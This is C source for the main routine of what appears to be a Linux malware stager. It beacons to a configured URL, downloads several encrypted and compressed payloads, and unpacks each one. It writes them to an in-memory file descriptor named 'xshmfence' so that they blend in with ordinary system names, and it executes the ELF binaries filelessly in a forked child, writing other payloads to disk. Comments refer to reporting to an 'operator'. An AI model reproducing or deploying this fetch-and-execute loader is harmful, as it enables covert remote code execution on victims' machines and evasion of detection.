#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include "detect.h"
#include "helpers.h"
#include "networking.h"
#include "preferences.h"

int main(int argc, char **argv)
{
    struct MemoryStruct payload;
    void *decrypted;
    void *decompressed;
    PayloadStruct *metaBytes; // holds the sizes of each payload
    unsigned int numPayloads;
    char *payloadOffset; // hold offset from payload base addr for addressing
    int payloadFD;       // in memory file descriptor
    int writeReturnSize;
    int d;                               //to hold the return value of detect()
    char *payload_argv[] = PAYLOAD_ARGV; // argv for payload
    char *payload_envp[] = PAYLOAD_ENVP; // envp for payload
    char *pathToWrite = PATH_TO_WRITE;
    pid_t child;

    payload = beacon(PAYLOAD_URL);
    payloadOffset = payload.memory; // hold for iteration

    numPayloads = getNumPayloads(payloadOffset);
    payloadOffset += 4;
    metaBytes = (PayloadStruct *)calloc(numPayloads, sizeof(PayloadStruct)); //allocate array of pointers to point to arrays of payload metadatas

    if (metaBytes == NULL)
    {
        return -1;
    }

    for (int i = 0; i < numPayloads; i++)
    { // define metadata arrays
        metaBytes[i].uncompressedLength = getUncompLen(payloadOffset);
        metaBytes[i].encryptedLength = getEncLen(payloadOffset);
        metaBytes[i].decryptedLength = getDecryptedLen(payloadOffset);
        payloadOffset += 12;
    }

    for (int i = 0; i < numPayloads; i++)
    { // main loop to deploy payloads

        decrypted = (void *)decrypt((unsigned char *)payloadOffset, metaBytes[i].encryptedLength, metaBytes[i].decryptedLength);
        if (decrypted == NULL)
        {
            free(decrypted);
            return -1;
        }

        decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)metaBytes[i].uncompressedLength, (uLong)metaBytes[i].decryptedLength);

        while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
        { // create memory file descriptor for execution
            close(payloadFD);
            return -1;
        }

        writeReturnSize = write(payloadFD, decompressed, metaBytes[i].uncompressedLength); // write to mem_fd and error check
        if (writeReturnSize != metaBytes[i].uncompressedLength)
        {
            return -1;
        }

        d = detect((unsigned char *)decompressed); //determine if the payload is an executable/ELF

        if (d == 1)
        {
            if ((child = fork()) == 0)
            {
                if (executePayload(payloadFD, payload_argv, payload_envp) == 0) // execute within child
                {
                    //send message to operator
                    free(decompressed);
                    close(payloadFD);
                    return -1;
                }
            }
            else
            {
                wait(&child); // wait for child to finish within parent
            }
        }
        else
        {
            writeToDisk(decompressed, pathToWrite, metaBytes[i].uncompressedLength);
        }
        free(decompressed);
        payloadOffset += metaBytes[i].encryptedLength; // increment offset to point at next payload
    }
    free(payload.memory);
    return 0;
}